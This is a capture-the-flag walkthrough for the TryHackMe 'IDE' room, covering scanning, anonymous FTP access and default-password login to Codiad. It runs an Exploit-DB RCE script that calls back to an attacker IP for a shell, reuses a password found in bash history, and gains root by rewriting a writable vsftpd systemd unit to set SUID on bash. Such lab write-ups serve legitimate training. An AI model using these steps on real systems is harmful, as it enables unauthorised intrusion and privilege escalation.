---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . IDE
# DESCRIPTION       . An easy box to polish your enumeration skills!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/ide
```

```
sudo nmap -sSVC -T5 -p- 10.10.53.183
```

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.53.183
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2bed33ce87681ef477ed043d4281428 (RSA)
|   256 a882e961e4bb61af9f3a193b64bcde87 (ECDSA)
|_  256 244675a76339b63ce9f1fca413516320 (ED25519)

80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)

62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


#### PORT 22 

- FTP allows for anonymous login and we have a directory called `...` 
- Inside, we were able to get a fille called `-`. 

```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

- Port 80 was just the default apache webpage and port 62337 was running Codiad 2.8.4.

#### PORT 62337

- We know the username is `john` and that the password was the default password. 
- I've tried using the common passwords I could think of: `admin`, `password`, `default`, `root`, `toor`, `(nothing)` and I've been lucky with one of these.

- Here we can find four `.py` files that seem to be the work-in-progress for a videocall app. 

- However, we can't run any python file directly from codiac and we can't install the terminal emulator plugin to allow us to do so since we don't have access to the server.

- After some research, I found [this](https://www.exploit-db.com/exploits/49705) script that allowed us to gain RCE. 

```
python3 49705.py  http://10.10.53.183:62337/ john password attacker_IP 3131 linux
```

- we are under `www-data`.


#### PRIVILEGE ESCALATION

- I went to `/home/drac` to try and get the `user.txt` flag but I didn't had access to read it.

- Then I've decided to take a look through the files in the same home directory and I found this in `.bash_history` file

```
mysql -u drac -p 'T{REDACTED}aL'
```

- there seems to be no mysql server / client installed on the box and I've tried the same password to authenticate as the user `drac`. it worked.

- Running `sudo -l` we see that we can run

```
(ALL : ALL) /usr/sbin/service vsftpd restart
```

- I tried using the privilege escalation vector found on gtfobins but I had no luck.

- Then, I was looking around at the vsftpd service

```
-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
```

- How "lucky" are we :) We have permissions to write to the file.

- So inside the `vsftpd.service` file I've replaced the `ExecStart` parameter with 

```
ExecStart=/bin/chmod +s /bin/bash
```

- After saving the file, I did a `systemcl daemon-reload` and then used `/bin/bash -p` to spawn a root shell.

- The first flag is in `/home/drac/user.txt`.
- The last flag is in `/root/root.txt`.


